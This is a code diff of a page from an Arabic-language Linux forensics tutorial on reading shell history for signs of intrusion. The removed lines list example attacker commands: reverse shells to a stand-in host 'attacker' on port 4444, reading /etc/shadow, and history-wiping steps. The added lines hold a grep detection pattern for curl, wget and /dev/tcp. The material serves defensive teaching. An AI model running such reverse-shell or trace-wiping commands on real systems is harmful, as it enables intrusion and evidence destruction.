@@ -1,190 +1,65 @@
 import Alert from '../../components/Alert';
 import CodeBlock from '../../components/CodeBlock';
+import Table from '../../components/Table';
 
-const LinuxHistorySection = () => {
-  return (
-    <div className="space-y-8">
-      <h1 className="text-3xl font-bold text-cyan-400 flex items-center gap-3">
-        <span>📜</span>
-        تاريخ الأوامر Bash History
-      </h1>
+const LinuxHistorySection = () => (
+  <div className="space-y-8">
+    <h1 className="text-3xl font-bold text-cyan-400">📜 Shell History كأثر مساعد</h1>
+    <Alert type="warning" title="History ليس audit log">
+      لا يسجل كل process: قد تُكتب الجلسة عند الخروج، تتداخل جلسات، تُستثنى أوامر، تُستخدم shell أخرى، أو يعدل المستخدم الملف. وجود command لا يثبت نجاحه، وغيابه لا يثبت أنه لم يُنفذ.
+    </Alert>
 
-      <div className="h-1 w-32 bg-gradient-to-l from-cyan-500 to-transparent rounded"></div>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">1. افهم المصدر قبل القراءة</h2>
+      <Table headers={['المصدر', 'ماذا يمثل؟', 'قيد مهم']} rows={[
+        ['history builtin', 'History المحملة في الجلسة الحالية', 'تختلف عن الملف وقد تشمل أوامر لم تُكتب بعد'],
+        ['~/.bash_history', 'History المحفوظة لـBash', 'HISTFILE/HISTCONTROL/HISTSIZE والجلسات تؤثر'],
+        ['~/.zsh_history وغيرها', 'صيغة shell أخرى', 'لا تفترض Bash من اسم الحساب'],
+        ['auditd/EDR/process accounting', 'تنفيذ processes حسب الإعداد', 'coverage/permissions/retention وقد تسجل arguments حساسة'],
+      ]} />
+      <CodeBlock title="Inventory read-only مع metadata" language="bash" code={`user_home=/home/labuser
+sudo stat -- "$user_home/.bash_history"
+sudo readlink -- "$user_home/.bash_history" || true
+sudo file -- "$user_home/.bash_history"
+sudo sha256sum -- "$user_home/.bash_history"
+sudo tail -n 100 -- "$user_home/.bash_history"`} />
+      <Alert type="danger">قد يحتوي history على passwords/tokens وURLs داخلية. لا تطبعه في terminal مشتركة ولا تنشره؛ اجمعه في case storage مصرح مع access control.</Alert>
+    </section>
 
-      <Alert type="golden" title="أهمية bash history للمحلل">
-        يظهر كل الأوامر التي نفذها المستخدم. من أول الأشياء التي يفحصها المحلل بعد اختراق محتمل!
-      </Alert>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">2. فرز patterns منزوعة السلاح</h2>
+      <CodeBlock language="bash" code={`hist=/home/labuser/.bash_history
+sudo grep -nEi -- \\
+  'curl|wget|scp|chmod|base64|history[[:space:]]+-c|unset[[:space:]]+HISTFILE|/dev/tcp|authorized_keys|systemctl|crontab' \\
+  "$hist" | head -n 100`} />
+      <div className="grid md:grid-cols-2 gap-4">
+        {[
+          ['Transfer', 'حدد المصدر والوجهة والملف؛ download command لا يثبت نجاح النقل أو التنفيذ.'],
+          ['Privilege/admin', 'sudo/su طبيعيان؛ اربط auth logs وTTY/user/command/change.'],
+          ['Discovery', 'id/uname/ps قد تكون troubleshooting؛ راقب التجمع والـparent/session.'],
+          ['History suppression', 'history -c أو HISTFILE gap مهم، لكنه قد يكون privacy policy أو lab.'],
+          ['Persistence changes', 'authorized_keys/cron/systemd تحتاج diff وowner/timestamps وexecution evidence.'],
+          ['Encoded text', 'اعرض decoding كبيانات فقط؛ لا pipe إلى shell ولا تشغل الناتج.'],
+        ].map(([title, body]) => <article key={title} className="rounded-xl border border-gray-700 bg-gray-800/50 p-5"><h3 className="font-bold text-cyan-300">{title}</h3><p className="mt-2 text-sm leading-7 text-gray-300">{body}</p></article>)}
+      </div>
+    </section>
 
-      {/* عرض History */}
-      <section className="space-y-4">
-        <h2 className="text-2xl font-bold text-white">عرض History</h2>
+    <section className="space-y-4">
+      <h2 className="text-2xl font-bold text-white">3. Timeline وcorroboration</h2>
+      <CodeBlock title="هل يحوي Bash timestamps؟" language="bash" code={`# Bash قد يخزن السطر #<epoch> قبل command عندما فُعّل timestamping.
+sudo sed -n '/^#[0-9][0-9]*$/,+1p' /home/labuser/.bash_history | tail -n 100
 
-        <CodeBlock
-          title="أوامر عرض التاريخ"
-          code={`# تاريخ المستخدم الحالي
-history
+# قارن نافذة محددة بالمصادقة وsudo (اسم الوحدة/الملف يختلف حسب النظام).
+sudo journalctl --since '2026-01-15 08:00:00' --until '2026-01-15 09:00:00' \\
+  _COMM=sudo --no-pager
+sudo journalctl -u ssh --since '2026-01-15 08:00:00' --until '2026-01-15 09:00:00' --no-pager`} />
+      <p className="leading-8 text-gray-300">اربط command بـlogin/session/TTY، process/network/file evidence وchange ticket. إن لم توجد timestamps فلا تصنع ترتيبًا دقيقًا من ترتيب lines وحده؛ merge behavior قد يربكه.</p>
+    </section>
 
-# أو من الملف مباشرة
-cat ~/.bash_history
-
-# تاريخ مستخدمين آخرين (يحتاج root)
-cat /home/username/.bash_history
-cat /root/.bash_history
-
-# البحث في التاريخ
-history | grep "wget"
-history | grep "sudo"`}
-        />
-      </section>
-
-      {/* ماذا تبحث عنه */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">🔍 ماذا تبحث عنه</h2>
-
-        <div className="grid md:grid-cols-2 gap-4">
-          {/* تنزيل ملفات */}
-          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
-            <h3 className="text-red-400 font-bold mb-4">1. أوامر تنزيل ملفات</h3>
-            <CodeBlock
-              code={`wget http://...
-curl -O http://...
-scp user@remote:/path/file .`}
-            />
-          </div>
-
-          {/* تنفيذ مشبوه */}
-          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
-            <h3 className="text-red-400 font-bold mb-4">2. تنفيذ مشبوه</h3>
-            <CodeBlock
-              code={`chmod +x malware
-./malware
-bash script.sh
-python exploit.py`}
-            />
-          </div>
-
-          {/* تصعيد صلاحيات */}
-          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
-            <h3 className="text-yellow-400 font-bold mb-4">3. محاولات تصعيد صلاحيات</h3>
-            <CodeBlock
-              code={`sudo su
-sudo -i
-su -
-sudo bash`}
-            />
-          </div>
-
-          {/* استكشاف */}
-          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
-            <h3 className="text-yellow-400 font-bold mb-4">4. أوامر استكشاف</h3>
-            <CodeBlock
-              code={`whoami
-id
-uname -a
-cat /etc/passwd
-cat /etc/shadow`}
-            />
-          </div>
-
-          {/* شبكة مشبوهة */}
-          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
-            <h3 className="text-red-400 font-bold mb-4">5. أوامر شبكة مشبوهة 🚨</h3>
-            <CodeBlock
-              code={`nc -lvp 4444
-bash -i >& /dev/tcp/attacker/4444 0>&1
-ncat -e /bin/bash attacker 4444`}
-            />
-          </div>
-
-          {/* حذف آثار */}
-          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
-            <h3 className="text-red-400 font-bold mb-4">6. أوامر حذف آثار 🚨</h3>
-            <CodeBlock
-              code={`history -c
-rm ~/.bash_history
-ln -s /dev/null ~/.bash_history
-unset HISTFILE`}
-            />
-          </div>
-        </div>
-      </section>
-
-      {/* علامات إخفاء الآثار */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">🚨 علامات أن المهاجم حاول إخفاء آثاره</h2>
-
-        <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
-          <ul className="space-y-3 text-gray-300">
-            <li className="flex items-center gap-2">
-              <span className="text-red-400">⚠️</span>
-              ملف <code className="bg-gray-700 px-2 py-1 rounded">.bash_history</code> فارغ
-            </li>
-            <li className="flex items-center gap-2">
-              <span className="text-red-400">⚠️</span>
-              ملف <code className="bg-gray-700 px-2 py-1 rounded">.bash_history</code> مرتبط بـ <code className="bg-gray-700 px-2 py-1 rounded">/dev/null</code>
-            </li>
-            <li className="flex items-center gap-2">
-              <span className="text-red-400">⚠️</span>
-              ملف <code className="bg-gray-700 px-2 py-1 rounded">.bash_history</code> مفقود
-            </li>
-            <li className="flex items-center gap-2">
-              <span className="text-red-400">⚠️</span>
-              أوامر <code className="bg-gray-700 px-2 py-1 rounded">history -c</code> في السجلات
-            </li>
-          </ul>
-        </div>
-
-        <CodeBlock
-          title="فحص ملفات history"
-          code={`# هل الملف موجود؟
-ls -la ~/.bash_history
-
-# هل هو رابط؟
-file ~/.bash_history
-
-# حجم الملف
-wc -l ~/.bash_history
-
-# آخر تعديل
-stat ~/.bash_history`}
-        />
-      </section>
-
-      {/* سكريبت فحص */}
-      <section className="space-y-4 mt-12">
-        <h2 className="text-2xl font-bold text-white">📋 سكريبت فحص history لكل المستخدمين</h2>
-
-        <CodeBlock
-          code={`#!/bin/bash
-echo "=== Checking Bash History for All Users ==="
-
-for user_home in /home/* /root; do
-  if [ -d "$user_home" ]; then
-    user=$(basename $user_home)
-    hist_file="$user_home/.bash_history"
-    
-    echo ""
-    echo "=== User: $user ==="
-    
-    if [ -f "$hist_file" ]; then
-      echo "History file exists"
-      echo "Lines: $(wc -l < $hist_file)"
-      echo "Last modified: $(stat -c %y $hist_file 2>/dev/null)"
-      
-      # البحث عن أوامر مشبوهة
-      echo "Suspicious commands:"
-      grep -E "wget|curl|nc |ncat|/dev/tcp|chmod \\+x|history -c" $hist_file 2>/dev/null | head -10
-    elif [ -L "$hist_file" ]; then
-      echo "WARNING: History is a symlink to $(readlink $hist_file)"
-    else
-      echo "WARNING: No history file found"
-    fi
-  fi
-done`}
-        />
-      </section>
-    </div>
-  );
-};
+    <Alert type="golden" title="تسليم Portfolio">
+      جدول من خمسة commands: رقم السطر، النص المنقح، ما يثبته، ما لا يثبته، دليل مستقل، وconfidence. أضف visibility gaps بدل عبارة «المهاجم حذف آثاره» بلا corroboration.
+    </Alert>
+  </div>
+);
 
 export default LinuxHistorySection;
